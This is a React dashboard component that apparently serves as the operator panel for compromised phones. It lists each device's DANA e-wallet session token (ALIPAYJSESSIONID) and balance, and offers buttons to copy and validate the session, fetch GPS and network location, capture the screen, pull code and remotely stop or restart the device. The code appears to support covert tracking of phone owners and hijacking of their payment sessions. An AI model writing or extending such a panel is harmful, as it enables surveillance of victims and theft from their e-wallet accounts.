import { useDispatch, useSelector } from "react-redux"
import { useEffect, useState } from "react"
import { Sheet } from "react-modal-sheet"
import { toast } from "react-toastify"
import { useNavigate } from "react-router-dom"

import { Prism as SyntaxHighlighter } from "react-syntax-highlighter"
import { vscDarkPlus } from "react-syntax-highlighter/dist/esm/styles/prism"

import { useGlobalSheet } from "../GlobalSheetProvider"
import { dispatchUser, dispatchDevice } from "../../features/configSlice"
import { logout } from "../../features/authSlice"
import { API, API_V2, DEFAULT_IMAGE } from "../../config"

import SheetDetailHeader from "./SheetDetailHeader"
import clipboard from "../../utils/clipboard"
import SheetList from "../SheetList"

import axios from "axios"
import Swal from "sweetalert2"
import saveFile from "../../utils/saveFile"

function DeviceCard({ id, title, start, thumb, community, session, balance, balanceDisplay, percentage, status, data }) {
  const [isOpen, setOpen] = useState(false)
  const [show, setShow] = useState(false)
  const [duration, setDuration] = useState("00:00:00")

  const [params, setParams] = useState({ action: "location" })
  const [result, setResult] = useState({})

  const { accessToken, username, role, avatar } = useSelector((state) => state.auth)
  const { openSheet } = useGlobalSheet()

  const dispatch = useDispatch()
  const navigate = useNavigate()

  const getDevices = async () => {
    try {
      const { data } = await axios.get(API + "/socket/devices", { headers: { Authorization: `Bearer ${accessToken}` } })
      dispatch(dispatchDevice(data.reverse()))
    } catch (error) {
      const status = error.status && typeof error.status === "number" ? error.status : error.response && error.response.status ? error.response.status : 500
      const message = error.response && error.response.data.message ? error.response.data.message : "Internal Server Error"

      console.log(error)
      toast.error(message, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: true,
        pauseOnHover: false,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            dispatch(logout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  const checkSessionProfile = async () => {
    try {
      const { data } = await axios.post(API + "/dana/profile", { ALIPAYJSESSIONID: session }, { headers: { Authorization: `Bearer ${accessToken}` } })
      const { message } = data

      setOpen(false)
      openSheet(data)
    } catch (error) {
      const message = error?.response?.data?.message || error.message || "UNKNOWN ERROR"

      setOpen(false)
      console.log(error)
      toast.error(message, { position: "top-right", autoClose: 1000, hideProgressBar: true, closeOnClick: true, pauseOnHover: false, draggable: true, theme: "colored" })
    }
  }

  const copy = (session) => {
    clipboard(session)
    setOpen(false)
  }

  const viewData = () => {
    setOpen(false)
    openSheet(data)
  }

  const handleAction = async (params) => {
    setOpen(false)
    setParams(params)

    if (params.action === "stop" || params.action === "restart") {
      const confirm = await Swal.fire({
        title: `${params.action} ${title} ?`.toUpperCase(),
        text: "You won't be able to revert this",
        icon: "warning",
        showCancelButton: true,
        draggable: true,
        confirmButtonColor: "#d33",
        cancelButtonColor: "#212529",
        confirmButtonText: params.action.toUpperCase(),
        cancelButtonText: "CANCEL",
        width: "300px",
        didOpen: () => {
          const titleEl = Swal.getTitle()
          const contentEl = Swal.getHtmlContainer()
          const confirmBtn = Swal.getConfirmButton()
          const cancelBtn = Swal.getCancelButton()

          if (titleEl) titleEl.style.fontSize = "1rem"
          if (contentEl) contentEl.style.fontSize = "0.9rem"

          if (confirmBtn) {
            confirmBtn.style.fontSize = "0.85rem"
            confirmBtn.style.borderRadius = "0.5rem"
            confirmBtn.style.padding = "6px 12px"
          }
          if (cancelBtn) {
            cancelBtn.style.fontSize = "0.85rem"
            cancelBtn.style.borderRadius = "0.5rem"
            cancelBtn.style.padding = "6px 12px"
          }
        },
      })

      if (!confirm.isConfirmed) return
    }

    const toastId = toast.loading(`Sending ${params.action} request to ${title}...`)

    try {
      let url = `${API}/socket/toggle`

      if (params.action === "location") url = `${API}/socket/location`
      if (params.action === "screen") url = `${API}/socket/screen`

      const { data } = await axios.post(url, { id, model: title, ...params }, { headers: { Authorization: `Bearer ${accessToken}` } })

      if (params.action === "screen" && data.buffer) {
        const uint8Array = new Uint8Array(data.buffer.data)
        const binary = uint8Array.reduce((acc, byte) => acc + String.fromCharCode(byte), "")
        const base64img = `data:image/png;base64,${btoa(binary)}`

        setResult(base64img)
      } else if (params.action === "pull" && data.data) {
        setResult(data.data)
      } else {
        setResult(data)
      }

      setShow(true)
    } catch (error) {
      const message = error?.response?.data?.message || error.message || "UNKNOWN ERROR"

      console.log(error)
      toast.error(message, { position: "top-right", autoClose: 1000, hideProgressBar: true, closeOnClick: true, pauseOnHover: false, draggable: true, theme: "colored" })
    } finally {
      toast.dismiss(toastId)
    }
  }

  useEffect(() => {
    const interval = setInterval(() => {
      const c = new Date() - new Date(start)
      const h = Math.floor(c / (1000 * 60 * 60))
      const m = Math.floor((c % (1000 * 60 * 60)) / (1000 * 60))
      const s = Math.floor((c % (1000 * 60)) / 1000)

      setDuration(`${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`)
    }, 1000)

    return () => clearInterval(interval)
  }, [start])

  return (
    <>
      <Sheet isOpen={isOpen} onClose={() => setOpen(false)} detent="content-height" className="custom-sheet">
        <Sheet.Container className="bg-dark">
          <Sheet.Header />
          <Sheet.Content className="px-3 py-2 p-lg-3">
            <SheetDetailHeader thumb={thumb || DEFAULT_IMAGE} title={title} community={community} balance={balance} balanceDisplay={balanceDisplay} session={session} start={start} />

            <div className="row g-2">
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1">
                <SheetList icon="content_copy" title="copy session" onClick={() => copy(session)} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1">
                <SheetList icon="experiment" title="check" onClick={() => checkSessionProfile()} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1">
                <SheetList icon="code" title="view exists data" onClick={() => viewData()} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="location_on" title="location network" onClick={() => handleAction({ action: "location", provider: "network" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="location_searching" title="location gps" onClick={() => handleAction({ action: "location", provider: "gps" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="stop_circle" title="terminate" onClick={() => handleAction({ action: "stop" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="restart_alt" title="restart" onClick={() => handleAction({ action: "restart" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="network_ping" title="ping" onClick={() => handleAction({ action: "ping" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="screenshot_monitor" title="screen" onClick={() => handleAction({ action: "screen" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="touch_app" title="wakeup" onClick={() => handleAction({ action: "wakeup" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="attach_money" title="balance" onClick={() => handleAction({ action: "balance" })} />
              </div>
              <div className="col-12 col-md-6 col-lg-3 px-1 py-0 px-lg-2 py-lg-1" style={{ display: role !== "admin" ? "none" : "" }}>
                <SheetList icon="script" title="pull code" onClick={() => handleAction({ action: "pull" })} />
              </div>
            </div>
          </Sheet.Content>
        </Sheet.Container>
        <Sheet.Backdrop style={{ backgroundColor: "rgba(0,0,0,0.7)" }} onTap={() => setOpen(false)} />
      </Sheet>

      <div
        className="card-image position-relative text-white overflow-hidden disable-select device-card"
        style={{
          aspectRatio: "1/1",
          borderRadius: "0.3rem",
          backgroundImage: `url(${thumb})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          cursor: "pointer",
        }}
        onDoubleClick={() => setOpen(true)}
      >
        <div className="hover-overlay d-flex flex-column justify-content-center align-items-center">
          <span className="hover-text ts-7">
            {percentage || 0}% {status || "UNKNOWN"}
          </span>
        </div>

        <div className="position-absolute w-100 h-100 device-card-detail">
          <div
            className="position-absolute bottom-0 left-0 p-2 w-100 device-card-detail"
            style={{ background: "linear-gradient(to top,rgba(0, 0, 0, 1) 0%, rgba(0, 0, 0, 0.7) 30%, rgba(0, 0, 0, 0.5) 60%, transparent 100%)" }}
          >
            <p className="ts-7 fw-bold m-0 text-uppercase text-light word-break">{title}</p>
            <p className="ts-6 m-0">Rp.{balanceDisplay || balance || "-"}</p>
          </div>
        </div>

        <div className="d-flex flex-row flex-wrap gap-1 position-absolute top-0 end-0 p-1">
          <small className="d-flex justify-content-center ts-6 rounded-pill px-2 py-1" style={{ background: "rgba(0, 0, 0, 0.6)" }}>
            {duration}
          </small>
        </div>
      </div>

      <Sheet isOpen={show} onClose={() => setShow(false)} detent="content-height" className="custom-sheet">
        <Sheet.Container className="bg-dark">
          <Sheet.Header className="px-3 py-3">
            <div className="d-flex">
              <div className="col d-flex flex-column justify-content-center align-items-start px-2">
                <h5 className="m-0 text-uppercase">{title}</h5>
              </div>
              <div className="d-flex justify-content-center align-items-center gap-3">
                <span className="material-symbols-outlined p-2 fw-bold" onClick={() => saveFile(result, params.action === "pull" ? "js" : "")}>
                  download
                </span>
                <span className="material-symbols-outlined p-2 fw-bold" onClick={() => setShow(false)}>
                  close
                </span>
              </div>
            </div>
          </Sheet.Header>
          <Sheet.Content className="px-3 py-2 p-lg-3">
            {params && params.action === "location" ? (
              <div className="w-full py-3 px-1" style={{ aspectRatio: "1/1" }}>
                <iframe
                  src={`https://www.google.com/maps?q=${result.latitude},${result.longitude}&hl=id&z=15&output=embed`}
                  width="100%"
                  height="100%"
                  style={{ border: 0 }}
                  allowFullScreen=""
                  loading="lazy"
                  referrerPolicy="no-referrer-when-downgrade"
                ></iframe>
              </div>
            ) : (
              ""
            )}

            {params && params.action === "screen" ? (
              <div className="m-0 pb-5 bg-danger table-responsive">
                <img
                  src={result || DEFAULT_IMAGE}
                  alt=""
                  className="pages-sheet-thumb"
                  onError={(e) => {
                    e.target.onerror = null
                    e.target.src = DEFAULT_IMAGE
                  }}
                />
              </div>
            ) : (
              ""
            )}

            {params && params.action !== "screen" ? (
              <SyntaxHighlighter
                language="json"
                style={vscDarkPlus}
                className="hide-scroll"
                customStyle={{
                  maxHeight: "50vh",
                  borderRadius: "0.8rem",
                  padding: "1rem",
                  fontSize: "0.7rem",
                  overflowY: "auto",
                }}
              >
                {typeof result === "object" ? JSON.stringify(result, null, 2) : String(result)}
              </SyntaxHighlighter>
            ) : (
              ""
            )}
          </Sheet.Content>
        </Sheet.Container>
        <Sheet.Backdrop style={{ backgroundColor: "rgba(0,0,0,0.7)" }} onTap={() => setShow(false)} />
      </Sheet>
    </>
  )
}

export default function DeviceContainer() {
  const { accessToken, username, role, avatar } = useSelector((state) => state.auth)
  const { users, devices } = useSelector((state) => state.config)

  const dispatch = useDispatch()
  const navigate = useNavigate()

  const getDevices = async () => {
    try {
      const { data } = await axios.get(API + "/socket/devices", { headers: { Authorization: `Bearer ${accessToken}` } })
      dispatch(dispatchDevice(data.reverse()))
    } catch (error) {
      const status = error.status && typeof error.status === "number" ? error.status : error.response && error.response.status ? error.response.status : 500
      const message = error.response && error.response.data.message ? error.response.data.message : "Internal Server Error"

      console.log(error)
      toast.error(message, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: true,
        pauseOnHover: false,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            dispatch(logout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  useEffect(() => {
    getDevices()
  }, [])

  if (devices.length === 0) return

  return (
    <>
      <div className="p-3">
        <div className="d-flex justify-content-between align-items-center disable-select py-2">
          <p className="fw-bold m-0 mb-3">DEVICES ({devices.length})</p>
        </div>
        <div className="row g-2 pt-2">
          {devices.map((x, i) => {
            const { id, model, start, thumb, community, ALIPAYJSESSIONID, balance, balanceDisplay, battery } = x
            const { percentage, status } = battery || {}

            return (
              <div key={i} className="col-4 col-md-4 col-lg-2">
                <DeviceCard
                  id={id}
                  title={model}
                  thumb={thumb}
                  session={ALIPAYJSESSIONID}
                  start={start}
                  percentage={percentage}
                  status={status}
                  community={community}
                  balance={balance}
                  balanceDisplay={balanceDisplay}
                  data={x}
                />
              </div>
            )
          })}
        </div>
      </div>
    </>
  )
}
